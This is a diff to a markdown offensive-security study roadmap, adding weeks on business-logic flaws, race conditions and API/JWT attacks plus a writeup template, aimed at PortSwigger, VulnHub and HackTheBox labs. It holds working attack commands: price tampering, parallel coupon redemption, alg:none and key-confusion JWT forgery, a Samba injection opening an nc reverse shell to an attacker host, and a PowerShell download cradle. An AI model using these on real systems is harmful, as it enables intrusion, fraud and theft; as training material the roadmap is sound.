@@ -1,4 +1,4 @@
-# Cybersecurity: 12-Week Hardcore Offensive Security Roadmap
+# Cybersecurity: 15-Week Hardcore Offensive Security Roadmap
 
 > **100% Free. Local-First. Zero Fluff.**  
 > Prerequisites: 5+ years Linux experience, basic networking (TCP/IP, DNS, HTTP).  
@@ -11,10 +11,11 @@
 | # | Domain | Focus |
 |---|--------|-------|
 | 1 | **Network Enumeration** | Nmap NSE, HackTricks methodology, protocol-specific probing |
-| 2 | **Web Hacking** | PortSwigger Server-Side labs, manual SQLi, SSRF, XXE |
-| 3 | **Privilege Escalation** | Manual checks, GTFOBins, LOLBAS, LinPEAS/WinPEAS analysis |
-| 4 | **Active Directory** | Manual exploitation, Kerberos abuse, Impacket, BloodHound logic |
-| 5 | **Exploitation** | Exploit-DB modification, manual reverse shells, BoF fundamentals |
+| 2 | **Web Hacking — Core** | PortSwigger Server-Side labs, manual SQLi, SSRF, XXE |
+| 3 | **Web Hacking — Advanced** | Business Logic, Race Conditions, API Security & JWT |
+| 4 | **Privilege Escalation** | Manual checks, GTFOBins, LOLBAS, LinPEAS/WinPEAS analysis |
+| 5 | **Active Directory** | Manual exploitation, Kerberos abuse, Impacket, BloodHound logic |
+| 6 | **Exploitation** | Exploit-DB modification, manual reverse shells, BoF fundamentals |
 
 ---
 
@@ -513,7 +514,237 @@ ffuf -u "http://<TARGET>/api" -X POST \
 
 ---
 
-## Week 7 — Privilege Escalation: Linux Manual Enumeration
+## Week 7 — Web Hacking: Business Logic Errors
+
+### Theory
+- PortSwigger Business Logic: https://portswigger.net/web-security/logic-flaws
+- HackTricks Business Logic: https://book.hacktricks.xyz/pentesting-web/business-logic-errors
+- OWASP Testing Guide OTG-BUSLOGIC: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing
+
+### Action
+**PortSwigger Free Labs:**
+- [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
+- [High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)
+- [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
+- [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
+- [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
+- [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
+- [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
+- [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
+
+**Key attack patterns:**
+```
+# 1. Price / quantity manipulation
+#    Submit negative quantity or fractional price via Burp Repeater:
+POST /cart HTTP/1.1
+{"productId":1,"quantity":-100,"price":9.99}
+#    Result: balance credit instead of debit
+
+# 2. Payment step bypass
+#    Map the checkout flow in Burp Proxy:
+GET  /cart/order-confirmation  (step 3)
+#    Skip directly to confirmation, omitting payment step:
+GET  /cart/order-confirmation?order-confirmed=true  (replay without payment)
+
+# 3. Coupon stacking / replay
+#    Add coupon → remove → re-add in rapid succession
+#    OR intercept and resend coupon application request multiple times
+POST /cart/coupon  {"code":"SAVE10"}  (repeat 5x — may apply discount each time)
+
+# 4. Workflow state confusion
+#    Register as "standard" user, then send request with "role=admin" parameter
+#    to the email-update endpoint — some apps update role without re-validating tier
+```
+
+```bash
+# Enumerate all parameters with Param Miner (Burp extension — free Community)
+# Manually: ffuf hidden parameter discovery
+ffuf -u "http://<TARGET>/checkout?FUZZ=1" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs <BASELINE_SIZE>
+
+# Intercept and modify multi-step forms with curl
+curl -v -c cookies.txt -b cookies.txt \
+  -X POST "http://<TARGET>/checkout/step2" \
+  -d "price=0.01&quantity=1&step=confirmed"
+```
+
+### Key Commands
+```bash
+# Replay a captured request with modified parameters
+curl -s -X POST "http://<TARGET>/api/order" \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=<SESSION>" \
+  -d '{"productId":1337,"quantity":1,"price":-999.00}'
+```
+
+**IppSec Reference:** Search "ippsec business logic" on YouTube
+
+---
+
+## Week 8 — Web Hacking: Race Conditions
+
+### Theory
+- PortSwigger Race Conditions: https://portswigger.net/web-security/race-conditions
+- Research paper — "Smashing the State Machine": https://portswigger.net/research/smashing-the-state-machine
+- HackTricks Race Conditions: https://book.hacktricks.xyz/pentesting-web/race-condition
+
+### Action
+**PortSwigger Free Labs:**
+- [Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
+- [Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
+- [Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
+- [Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
+
+**VulnHub Machine:**
+- **DVWA** — Brute Force module at HIGH security level (timing window)
+
+```bash
+# Turbo Intruder (Burp extension — free): single-packet attack
+# Send 20 simultaneous requests in one TCP packet to eliminate network jitter
+# In Turbo Intruder Python script:
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=20,
+                           pipeline=True)
+    for i in range(20):
+        engine.queue(target.req)
+
+# curl: parallel redemption attack (gift card / promo code)
+seq 20 | xargs -P 20 -I{} curl -s -X POST "http://<TARGET>/redeem" \
+  -d "code=PROMO50&userId=42"
+
+# Python: simultaneous withdrawal (multi-thread race)
+import threading, requests
+
+def withdraw():
+    requests.post("http://<TARGET>/api/withdraw",
+                  json={"amount": 100},
+                  cookies={"session": "<SESSION>"})
+
+threads = [threading.Thread(target=withdraw) for _ in range(10)]
+[t.start() for t in threads]
+[t.join() for t in threads]
+```
+
+### Key Commands
+```bash
+# Measure timing window with curl verbose timing
+curl -w "@/tmp/curl_format.txt" -s -o /dev/null \
+  -X POST "http://<TARGET>/api/vote" -d "id=1"
+# /tmp/curl_format.txt: "time_total: %{time_total}\n"
+
+# Detect race window: compare response times under concurrent load
+ab -n 100 -c 50 -p /tmp/post.txt -T application/json \
+  "http://<TARGET>/api/coupon/apply"
+```
+
+**IppSec Reference:** Search "ippsec race condition" or "portswigger race condition turbo intruder" on YouTube
+
+---
+
+## Week 9 — Web Hacking: API Security & JWT Attacks
+
+### Theory
+- PortSwigger API Security: https://portswigger.net/web-security/api-testing
+- PortSwigger JWT: https://portswigger.net/web-security/jwt
+- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
+- HackTricks API Pentesting: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting
+
+### Action
+**PortSwigger Free Labs:**
+- JWT:
+  - [JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
+  - [JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
+  - [JWT authentication bypass via weak signing secret](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-secret)
+  - [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
+  - [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
+- API Testing:
+  - [Exploiting an API endpoint using documentation](https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation)
+  - [Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)
+  - [Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
+  - [Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)
+
+```bash
+# === API ENUMERATION ===
+
+# Discover API endpoints via JS file analysis
+curl -s "http://<TARGET>/app.js" | grep -oE '(/api/[^"'"'"'\s]+)' | sort -u
+
+# OpenAPI / Swagger spec enumeration
+curl "http://<TARGET>/api/swagger.json"
+curl "http://<TARGET>/api/openapi.yaml"
+curl "http://<TARGET>/v2/api-docs"   # Spring Boot Actuator
+
+# ffuf: brute-force REST endpoints
+ffuf -u "http://<TARGET>/api/v1/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
+  -mc 200,201,400,401,403 -o api_endpoints.json
+
+# BOLA (Broken Object Level Authorization): horizontal privilege escalation
+# Auth as user A, access user B's object by incrementing ID
+curl -H "Authorization: Bearer <USER_A_TOKEN>" \
+  "http://<TARGET>/api/users/2/orders"   # should be user B's data
+curl -H "Authorization: Bearer <USER_A_TOKEN>" \
+  "http://<TARGET>/api/users/2/profile"
+
+# Mass Assignment: send undocumented fields
+curl -X POST "http://<TARGET>/api/users/register" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker","password":"x","role":"admin","isAdmin":true}'
+
+# === JWT ATTACKS ===
+
+# 1. alg:none — strip signature entirely
+# Decode header+payload, change alg to "none", remove signature
+HEADER=$(echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
+PAYLOAD=$(echo '{"sub":"admin","role":"admin","iat":1700000000}' | base64 | tr -d '=' | tr '+/' '-_')
+TOKEN="${HEADER}.${PAYLOAD}."
+curl -H "Authorization: Bearer ${TOKEN}" "http://<TARGET>/admin"
+
+# 2. Weak secret brute-force with hashcat
+# Extract JWT from Burp, save to /tmp/jwt.txt, format: header.payload.signature
+hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
+
+# 3. Algorithm confusion: RS256 → HS256
+# If server uses RS256, obtain public key, then sign with it as HMAC secret
+# python-jwt / pyjwt:
+python3 -c "
+import jwt, base64
+pubkey = open('public.pem').read()
+payload = {'sub':'admin','role':'admin'}
+token = jwt.encode(payload, pubkey, algorithm='HS256')
+print(token)
+"
+
+# 4. JWK injection (kid header pointing to attacker-controlled key)
+# Set 'jku' to your server hosting a JWKS endpoint
+# PortSwigger JWT labs cover this end-to-end
+```
+
+### Key Commands
+```bash
+# jwt_tool: comprehensive JWT attack automation (free)
+# https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py <TOKEN> -T          # tamper interactively
+python3 jwt_tool.py <TOKEN> -X a        # alg:none attack
+python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt  # crack secret
+
+# Arjun: hidden parameter discovery for APIs
+pip3 install arjun
+arjun -u "http://<TARGET>/api/user" -m POST
+
+# Kiterunner: API endpoint bruteforce with real-world wordlists
+# https://github.com/assetnote/kiterunner
+kr scan "http://<TARGET>" -w /usr/share/seclists/Discovery/Web-Content/api/routes-large.kite
+```
+
+**IppSec Reference:** Search "ippsec JWT" or "ippsec API security" on YouTube
+
+---
+
+## Week 10 — Privilege Escalation: Linux Manual Enumeration
 
 ### Theory
 - GTFOBins: https://gtfobins.github.io/ — every binary with sudo/SUID/capabilities abuse
@@ -600,7 +831,7 @@ echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
 
 ---
 
-## Week 8 — Privilege Escalation: Windows Manual Enumeration
+## Week 11 — Privilege Escalation: Windows Manual Enumeration
 
 ### Theory
 - LOLBAS: https://lolbas-project.github.io/ — Living Off the Land Binaries
@@ -669,7 +900,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<
 
 ---
 
-## Week 9 — Active Directory: Enumeration & Initial Compromise
+## Week 12 — Active Directory: Enumeration & Initial Compromise
 
 ### Theory
 - The Hacker Recipes AD: https://www.thehacker.recipes/ad/
@@ -738,7 +969,7 @@ crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce
 
 ---
 
-## Week 10 — Active Directory: Lateral Movement & Domain Compromise
+## Week 13 — Active Directory: Lateral Movement & Domain Compromise
 
 ### Theory
 - Pass-the-Hash/Ticket attacks: https://www.thehacker.recipes/ad/movement/ntlm
@@ -802,7 +1033,7 @@ MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS
 
 ---
 
-## Week 11 — Exploitation: Manual Reverse Shells & Exploit-DB Modification
+## Week 14 — Exploitation: Manual Reverse Shells & Exploit-DB Modification
 
 ### Theory
 - Exploit-DB: https://www.exploit-db.com/ — searchsploit index
@@ -871,7 +1102,7 @@ socat TCP:<ATTACKER>:4444 EXEC:'cmd.exe',pipes
 
 ---
 
-## Week 12 — Exploitation: Buffer Overflow Fundamentals
+## Week 15 — Exploitation: Buffer Overflow Fundamentals
 
 ### Theory
 - Aleph One "Smashing the Stack for Fun and Profit" (free, Phrack #49): http://phrack.org/issues/49/14.html
@@ -970,7 +1201,196 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 ---
 
-## Post-12-Week: Continuous Practice
+## Phase 3: The Infinite Game (Post-Week 15)
+
+---
+
+### Maintenance Routine
+
+**Monthly cadence — no-decay practice plan:**
+
+| Week | Task |
+|------|------|
+| Week 1 of month | VulnHub Linux machine (pick from list below, no writeup for 2h) |
+| Week 2 of month | HackTheBox free-tier Windows machine (retired box via free account) |
+| Week 3 of month | 2 PortSwigger practitioner-level labs (any domain) + 1 new CVE analysis |
+| Week 4 of month | Write a clean GitHub writeup for the two machines (see template below) |
+
+**Rotation machines (rotate quarterly, all free):**
+```
+Linux (VulnHub):  Kioptrix 1-5, SickOS 1.1, Lin.Security, Bulldog, Stapler
+Windows (HTB):    Legacy, Blue, Devel, Jerry, Optimum, Bastard, Bounty
+AD (HTB free):    Forest, Active, Sauna, Resolute
+```
+
+---
+
+### Professional Portfolio Template
+
+Create one Markdown file per machine in a public GitHub repo (`your-username/security-writeups`).
+
+```markdown
+# [Machine Name] — VulnHub/HTB Writeup
+
+## Executive Summary (Business Impact)
+> One paragraph. Assume the reader is a non-technical manager.
+> Example: "A default SMB configuration on this host allowed unauthenticated
+> remote code execution, enabling full compromise of all data and lateral
+> movement to the domain controller within 10 minutes of network access."
+
+**CVSS Score (estimated):** CVSS v3.1: 9.8 (Critical)  
+**CWE:** CWE-287 (Improper Authentication) / CWE-78 (OS Command Injection) / etc.
+
+---
+
+## Technical Enumeration
+
+### Port Scan
+```bash
+nmap -sV -sC -O -p- --min-rate 5000 -oA full_scan <TARGET>
+```
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2
+80/tcp open  http    Apache 2.4.18
+445/tcp open  netbios-ssn Samba 3.x
+```
+
+### Service Analysis
+- **Port 80:** Apache 2.4.18 — directory listing enabled at `/backup/`
+- **Port 445:** Samba 3.0.20 — vulnerable to CVE-2007-2447 (username map script)
+
+---
+
+## Exploitation
+
+### Initial Access — [Vulnerability Name]
+
+**Vulnerability:** [e.g., Samba usermap_script (CVE-2007-2447)]  
+**Impact:** Unauthenticated Remote Code Execution as root
+
+```bash
+# Manual exploitation (no Metasploit)
+smbclient //<TARGET>/tmp
+smb: \> logon "./=`nohup nc -e /bin/bash <ATTACKER> 4444`"
+```
+
+**Listener:**
+```bash
+nc -lvnp 4444
+# Result: root shell received
+```
+
+### Privilege Escalation (if needed)
+
+**Vector:** [e.g., SUID binary / sudo -l / cron job]
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+# Found: /usr/bin/nmap (old version with interactive mode)
+nmap --interactive
+nmap> !sh
+# id: uid=0(root)
+```
+
+---
+
+## Detailed Remediation
+
+### Finding 1 — [Vulnerability Name]
+**Affected component:** `smbd` Samba 3.0.20  
+**Root cause:** The `username map script` option allows shell metacharacter injection.
+
+**Code-level fix (smb.conf):**
+```ini
+# BEFORE (vulnerable):
+username map script = /etc/samba/smbusers
+
+# AFTER (fix): remove the option entirely, or disable map script execution
+# and upgrade Samba to >= 3.0.25
+```
+
+**Patch:** Upgrade to Samba 3.6.25+ or apply vendor patch.  
+**Verification:** `smbd --version && testparm smb.conf`
+
+### Finding 2 — [Vulnerability Name]
+...
+```
+
+---
+
+### Specialization Paths (100% Free)
+
+#### Bug Bounty
+| Resource | URL |
+|----------|-----|
+| Hacker101 (free video course + CTF) | https://www.hacker101.com/ |
+| Bugcrowd University | https://www.bugcrowd.com/hackers/bugcrowd-university/ |
+| HackerOne Hacktivity (real disclosed reports) | https://hackerone.com/hacktivity |
+| PortSwigger Web Security Academy | https://portswigger.net/web-security |
+
+**Workflow:** Complete Hacker101 CTF → submit to private programs on HackerOne/Bugcrowd → escalate to public programs once 3+ valid reports submitted.
+
+#### Red Teaming
+| Resource | URL |
+|----------|-----|
+| ired.team (Red Team Notes) | https://www.ired.team/ |
+| The Hacker Recipes | https://www.thehacker.recipes/ |
+| C2 Matrix (free C2 comparison) | https://www.thec2matrix.com/ |
+| Sliver C2 (open source) | https://github.com/BishopFox/sliver |
+
+**Workflow:** ired.team → implement each technique in your local AD lab → build a custom C2 implant with Sliver → simulate a full kill chain (initial access → persistence → lateral movement → exfil).
+
+#### Cloud Security
+| Resource | URL |
+|----------|-----|
+| CloudGoat (Rhino Security Labs — intentionally vulnerable AWS) | https://github.com/RhinoSecurityLabs/cloudgoat |
+| Flaws.cloud (AWS misconfig challenges) | http://flaws.cloud/ |
+| Flaws2.cloud (attacker + defender path) | http://flaws2.cloud/ |
+| HackTricks Cloud | https://cloud.hacktricks.xyz/ |
+| Pacu (AWS exploitation framework) | https://github.com/RhinoSecurityLabs/pacu |
+
+**Workflow:** Flaws.cloud levels 1–6 → Flaws2.cloud → CloudGoat scenarios (IAM Privilege Escalation, ECS Takeover) → document findings in your portfolio.
+
+---
+
+### Intelligence — Staying Current
+
+#### Newsletters (free)
+| Newsletter | Focus | Subscribe |
+|-----------|-------|-----------|
+| tl;dr sec | Weekly security research digest | https://tldrsec.com/ |
+| Risky Business | Weekly infosec news + interviews | https://risky.biz/subscribe/ |
+
+#### Podcasts (free)
+| Podcast | Focus | URL |
+|---------|-------|-----|
+| Darknet Diaries | Real-world hack stories | https://darknetdiaries.com/ |
+| Security Now (TWiT) | Deep technical dives (TLS, crypto, vulns) | https://twit.tv/shows/security-now |
+
+#### CVE & Exploit Databases
+| Database | Use Case | URL |
+|---------|---------|-----|
+| NVD — National Vulnerability Database | Official CVSS scores and CVE details | https://nvd.nist.gov/ |
+| Exploit-DB | Public PoC exploits, searchable by CVE | https://www.exploit-db.com/ |
+| Sploitus | Aggregates Exploit-DB + GitHub PoCs + Packetstorm | https://sploitus.com/ |
+
+**Daily 0-day monitoring workflow:**
+```bash
+# RSS feed monitoring (add to your RSS reader)
+# NVD new CVEs:    https://nvd.nist.gov/feeds/xml/cve/misc/nvd-rss.xml
+# Exploit-DB RSS:  https://www.exploit-db.com/rss.xml
+
+# Search Sploitus for new PoCs on a specific product
+curl -s "https://sploitus.com/search?query=apache+2.4.50" | python3 -m json.tool
+
+# searchsploit: local offline Exploit-DB mirror
+searchsploit --update         # sync with latest Exploit-DB
+searchsploit apache 2.4       # search for Apache exploits
+searchsploit -j openssh 7.2   # JSON output for scripting
+```
+
+---
 
 ### Wargames (100% Free, Online)
 | Platform | Focus | URL |
